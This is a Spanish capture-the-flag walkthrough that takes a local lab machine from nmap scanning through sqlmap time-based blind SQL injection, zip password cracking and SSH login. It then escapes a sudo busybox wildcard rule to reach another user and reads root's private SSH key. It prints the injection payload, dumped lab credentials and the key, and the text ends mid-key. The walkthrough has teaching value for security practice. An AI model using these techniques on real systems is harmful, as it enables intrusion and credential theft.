---
icon: flag
---

# CTF inj3ct0rs Intermediate

URL Download CTF = [https://drive.google.com/file/d/1tAL7aa1YRoQsWdbrz1ChNA2dRASE5u\_3/view?usp=sharing](https://drive.google.com/file/d/1tAL7aa1YRoQsWdbrz1ChNA2dRASE5u_3/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip inj3ct0rs.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh inj3ct0rss.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.22.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 08:56 EDT
Nmap scan report for 172.22.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fd:f8:90:30:73:b2:51:20:2d:cb:7a:77:67:69:dc:e5 (ECDSA)
|_  256 ad:54:3f:1a:45:7c:b5:97:fb:5b:a8:fb:63:1d:1d:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Inj3ct0rs CTF - P\xC3\xA1gina Principal
MAC Address: 02:42:AC:16:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

Por lo que vemos hay una pagina web que si entramos nos encontramos con bastante informacion pero nada importante, hay 2 botones denajo `Iniciar sesion` y `Registrarse` ambos funcionan y te puedes craer un usuario para iniciar sesion y entrar, por lo que hay un `mysql` por detras, probaremos a hacer `SQL Injection` en el inicio de sesion.

## SQL Injection

Primero abriremos `BurpSuit` para capturar la peticion y crear un `request.txt` con los datos para `sqlmap`.

> request.txt

```
POST /content_pages_hidden/db.php HTTP/1.1
Host: 172.22.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.22.0.2
Connection: close
Referer: http://172.22.0.2/login.php
Upgrade-Insecure-Requests: 1


username=admin&password=admin
```

Una vez teniendo el archivo empezaremos a sacar informacion con `sqlmap`.

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:01:20 /2024-08-15/

[09:01:20] [INFO] parsing HTTP request from 'request.txt'
[09:01:20] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.22.0.2/content_pages_hidden/fail.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[09:01:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:01:22] [INFO] testing if the target URL content is stable
[09:01:22] [WARNING] POST parameter '
username' does not appear to be dynamic
[09:01:23] [WARNING] heuristic (basic) test shows that POST parameter '
username' might not be injectable
[09:01:23] [INFO] testing for SQL injection on POST parameter '
username'
[09:01:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:01:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:01:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:01:23] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:01:23] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[09:01:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[09:01:23] [INFO] testing 'Generic inline queries'
[09:01:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:01:23] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                      
[09:01:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[09:01:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[09:01:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:01:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:01:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[09:01:23] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[09:01:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[09:01:24] [WARNING] POST parameter '
username' does not seem to be injectable
[09:01:24] [WARNING] POST parameter 'password' does not appear to be dynamic
[09:01:24] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[09:01:24] [INFO] heuristic (XSS) test shows that POST parameter 'password' might be vulnerable to cross-site scripting (XSS) attacks
[09:01:24] [INFO] testing for SQL injection on POST parameter 'password'
[09:01:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:01:24] [WARNING] reflective value(s) found and filtering out
[09:01:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:01:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:01:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:01:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[09:01:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[09:01:24] [INFO] testing 'Generic inline queries'
[09:01:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:01:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[09:01:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[09:01:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:01:35] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[09:01:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:01:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:01:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:01:37] [INFO] target URL appears to have 3 columns in query
n
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[09:01:42] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[09:01:42] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[09:01:43] [INFO] checking if the injection point on POST parameter 'password' is a false positive
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 202 HTTP(s) requests:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG
---
[09:02:29] [INFO] the back-end DBMS is MySQL
[09:02:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[09:02:29] [INFO] fetching database names
[09:02:29] [INFO] fetching number of databases
[09:02:29] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
5
[09:02:41] [INFO] retrieved: 
[09:02:46] [INFO] adjusting time delay to 1 second due to good response times
mysql
[09:03:02] [INFO] retrieved: information_schema
[09:04:01] [INFO] retrieved: performance_schema
[09:04:58] [INFO] retrieved: sys
[09:05:08] [INFO] retrieved: injectors_db
available databases [5]:
[*] information_schema
[*] injectors_db
[*] mysql
[*] performance_schema
[*] sys

[09:05:49] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 48 times
[09:05:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.22.0.2'

[*] ending @ 09:05:49 /2024-08-15/
```

Por lo que vemos hay una base de datos llamada `injectors_db` por lo que veremos que hay dentro de la siguiente forma.

```shell
sqlmap -r request.txt -D injectors_db --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:07:43 /2024-08-15/

[09:07:44] [INFO] parsing HTTP request from 'request.txt'
[09:07:44] [INFO] resuming back-end DBMS 'mysql' 
[09:07:44] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.22.0.2/content_pages_hidden/fail.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG
---
[09:07:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[09:07:46] [INFO] fetching tables for database: 'injectors_db'
[09:07:46] [INFO] fetching number of tables for database 'injectors_db'
[09:07:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
[09:07:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
1
[09:07:55] [INFO] retrieved: 
[09:08:05] [INFO] adjusting time delay to 1 second due to good response times
users
Database: injectors_db
[1 table]
+-------+
| users |
+-------+

[09:08:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.22.0.2'

[*] ending @ 09:08:18 /2024-08-15/
```

Vemos que hay una tabla llamada `users`, por lo que veremos como se compone por dentro para saber que mas informacion hay dentro.

```shell
sqlmap -r request.txt -D injectors_db -T users --columns
```

Info:

```
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:10:14 /2024-08-15/

[09:10:14] [INFO] parsing HTTP request from 'request.txt'
[09:10:14] [INFO] resuming back-end DBMS 'mysql' 
[09:10:14] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.22.0.2/content_pages_hidden/fail.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG
---
[09:10:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[09:10:17] [INFO] fetching columns for table 'users' in database 'injectors_db'
[09:10:17] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
[09:10:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[09:10:35] [INFO] adjusting time delay to 1 second due to good response times
3
[09:10:35] [INFO] retrieved: id
[09:10:42] [INFO] retrieved: int
[09:10:53] [INFO] retrieved: password
[09:11:21] [INFO] retrieved: varchar(50)
[09:11:55] [INFO] retrieved: username
[09:12:18] [INFO] retrieved: varchar(50)
Database: injectors_db
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

[09:12:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.22.0.2'

[*] ending @ 09:12:52 /2024-08-15/
```

Ahora que sabemos como se compone la tabla, haremos este ultimo paso.

```shell
sqlmap -r request.txt -D injectors_db -T users -C id,username,password --dump
```

Info:

```
      ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:14:00 /2024-08-15/

[09:14:00] [INFO] parsing HTTP request from 'request.txt'
[09:14:00] [INFO] resuming back-end DBMS 'mysql' 
[09:14:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.22.0.2/content_pages_hidden/fail.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG
---
[09:14:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[09:14:12] [INFO] fetching entries of column(s) 'id,password,username' for table 'users' in database 'injectors_db'
[09:14:12] [INFO] fetching number of column(s) 'id,password,username' entries for table 'users' in database 'injectors_db'
[09:14:12] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[09:14:22] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[09:14:22] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                
[09:14:33] [INFO] adjusting time delay to 1 second due to good response times
1
[09:14:33] [INFO] retrieved: loveyou
[09:14:58] [INFO] retrieved: root
[09:15:15] [INFO] retrieved: 2
[09:15:18] [INFO] retrieved: chicago123
[09:15:44] [INFO] retrieved: jane
[09:15:55] [INFO] retrieved: 3
[09:15:58] [INFO] retrieved: password
[09:16:26] [INFO] retrieved: admin
[09:16:41] [INFO] retrieved: 4
[09:16:45] [INFO] retrieved: no_mirar_en_este_directorio
[09:18:22] [INFO] retrieved: ralf
Database: injectors_db
Table: users
[4 entries]
+----+----------+-----------------------------+
| id | username | password                    |
+----+----------+-----------------------------+
| 1  | root     | loveyou                     |
| 2  | jane     | chicago123                  |
| 3  | admin    | password                    |
| 4  | ralf     | no_mirar_en_este_directorio |
+----+----------+-----------------------------+

[09:18:35] [INFO] table 'injectors_db.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.22.0.2/dump/injectors_db/users.csv'
[09:18:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.22.0.2'

[*] ending @ 09:18:35 /2024-08-15/
```

Vemos varias credenciales pero ninguna funciona con `SSH` o no hace ninguna funcion en la pagina, pero vemos una contraseña bastante distintiva `no_mirar_en_este_directorio` por lo que probaremos a ponerlo como URL de un directorio web.

## Directorio web

```
URL = http://<IP>/no_mirar_en_este_directorio/
```

Si nos vamos ahi veremos que existe y contiene un archivo zip llamado `secret.zip` que si nos lo descargamos veremos que tiene contraseña por lo que haremos lo siguiente.

## zip2jhon

Intentaremos crackear la contraseña del zip.

```shell
zip2john secret.zip > hash
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (secret.zip/confidencial.txt)     
1g 0:00:00:00 DONE (2024-08-15 11:14) 33.33g/s 1092Kp/s 1092Kc/s 1092KC/s 123456..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Veremos que la contraseña es `computer` por lo que ahora si lo descomprimiremos.

## unzip

```shell
unzip secret.zip
```

Info:

```
Archive:  secret.zip
[secret.zip] confidencial.txt password: 
  inflating: confidencial.txt
```

Metemos la contraseña y ya lo tendriamos descomprimido, veremos un archivo `.txt` llamado `confidencial.txt` y si lo leemos veremos lo siguiente.

```shell
You have to change your password ralf, I have told you many times, log into your account and I will change your password.

Your new credentials are:

ralf:supersecurepassword
```

Nos muestra las credenciales de un usuario, por lo que probaremos en ssh.

## SSH

```shell
ssh ralf@<IP>
```

Metemos la contraseña y ya estariamos dentro, por lo que leeremos la flag.

> user.txt (flag1)

```
382af2fb41eb95b1d6c6358b6c55ffce
```

## Escalate user capa

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for ralf on edf1dfeaf331:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ralf may run the following commands on edf1dfeaf331:
    (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
```

Vemos que podemos ejecutar como el usuario `capa` el binario `busybox` con todo el contenido de dentro de la carpeta `/nothing` pero hay un truco para poder escapar de esa carpeta y poder ejecutar lo que queramos ya que tiene el simbolo `*` y a nivel de sistema operativo se puede hacer lo siguiente.

```shell
sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh
```

Haciendo eso obtendremos una shell de `sh` como el usuario `capa`, por lo que ahora cambiaremos a la shell de `bash`.

```shell
/bin/bash
```

Y ya tendremos una shell normal con el usuario `capa`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for capa on edf1dfeaf331:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User capa may run the following commands on edf1dfeaf331:
    (ALL : ALL) NOPASSWD: /bin/cat
```

Vemos que podemos ejecutar como `root` el binario `cat` por lo que podremos ver lo que queramos, probaremos a ver si `root` tiene una clave `id_rsa`.

```shell
sudo cat /root/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
